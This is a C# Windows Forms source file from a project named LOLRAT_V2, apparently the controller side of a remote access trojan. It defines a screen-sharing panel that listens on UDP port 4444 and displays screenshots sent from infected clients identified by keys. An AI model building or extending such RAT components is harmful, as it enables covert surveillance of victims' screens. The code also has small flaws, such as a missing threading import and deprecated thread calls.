using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace LOLRAT_V2
{
    public partial class Screensharing : Form
    {
        private UdpClient udpClient;
        private Thread udpListenerThread;
        private bool listening;

        public Form1 _form1;
        public string _clientKey;

        public Screensharing(Form1 form1, string ClientKey)
        {
            InitializeComponent();
            _form1 = form1;
            _clientKey = ClientKey;
            lblTitle.Text = "Screensharing: " + _clientKey;
            listening = false;
        }

        private void btnToggleUDP_Click(object sender, EventArgs e)
        {
            if (!listening)
            {
                StartUDPListener();
                btnToggleUDP.Text = "Stop UDP";
            }
            else
            {
                StopUDPListener();
                btnToggleUDP.Text = "Start UDP";
            }
        }

        private void StartUDPListener()
        {
            try
            {
                udpClient = new UdpClient(4444); // Listening on port 4444
                udpListenerThread = new Thread(ListenForScreenshots);
                udpListenerThread.Start();
                listening = true;
                _form1.Log("UDP Listener started for Client: " + _clientKey);
            }
            catch (Exception ex)
            {
                _form1.Log("Error starting UDP Listener: " + ex.Message);
            }
        }

        private void StopUDPListener()
        {
            try
            {
                if (udpClient != null)
                    udpClient.Close();

                if (udpListenerThread.IsAlive)
                {
                    udpListenerThread.Suspend();
                    udpListenerThread.Abort();
                }
                listening = false;
                _form1.Log("UDP Listener stopped for Client: " + _clientKey);
            }
            catch (Exception ex)
            {
                _form1.Log("Error stopping UDP Listener: " + ex.Message);
            }
        }

        private void ListenForScreenshots()
        {
            try
            {
                while (listening)
                {
                    IPEndPoint remoteEndPoint = new IPEndPoint(IPAddress.Any, 0);
                    byte[] receivedBytes = udpClient.Receive(ref remoteEndPoint);

                    // Convert bytes to image
                    using (var ms = new System.IO.MemoryStream(receivedBytes))
                    {
                        Image screenshot = Image.FromStream(ms);
                        DisplayScreenshot(screenshot);
                    }
                }
            }
            catch (Exception ex)
            {
                _form1.Log("Error receiving screenshot: " + ex.Message);
            }
        }

        private void DisplayScreenshot(Image screenshot)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<Image>(DisplayScreenshot), new object[] { screenshot });
                return;
            }

            pictureBox.Image = screenshot;
        }

        private void btnSnap_Click(object sender, EventArgs e)
        {
            _form1.Log("Taking Screenshot of Client: " + _clientKey);
            // Trigger screenshot send event here if needed
        }

        private void Screensharing_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Disable listener when form is closed
            StopUDPListener();
        }
    }
}
